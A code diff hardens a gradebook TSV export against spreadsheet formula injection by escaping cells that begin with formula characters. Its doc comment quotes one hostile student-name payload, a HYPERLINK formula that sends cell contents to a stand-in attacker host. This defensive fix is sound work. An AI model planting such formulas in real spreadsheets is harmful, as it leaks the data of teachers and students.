@@ -224,5 +224,21 @@ export function gradebookTsv(rows: readonly GradebookRow[]): string {
     ];
   });
 
-  return [header, ...cells].map((row) => row.map((cell) => cell.replace(/[\t\n\r]+/g, " ")).join("\t")).join("\n");
+  return [header, ...cells].map((row) => row.map(safeCell).join("\t")).join("\n");
+}
+
+/**
+ * One cell, safe to paste into a spreadsheet.
+ *
+ * Tabs and newlines go because they would move the cell. The leading apostrophe is the other
+ * half, and it is there because a name is student-controlled: in a class with no list a student
+ * types their own label, and a security review self-named as
+ * `=HYPERLINK("http://evil.example/?"&A1,"grade")`, which BOW stored verbatim and put in a
+ * gradebook cell. A teacher pressing "Copy for a gradebook" and pasting into Sheets then has a
+ * live formula reading their column. Modern spreadsheets warn on paste; a school product should
+ * not be relying on the warning.
+ */
+function safeCell(cell: string): string {
+  const flattened = cell.replace(/[\t\n\r]+/g, " ");
+  return /^[=+\-@\t\r]/.test(flattened) ? `'${flattened}` : flattened;
 }
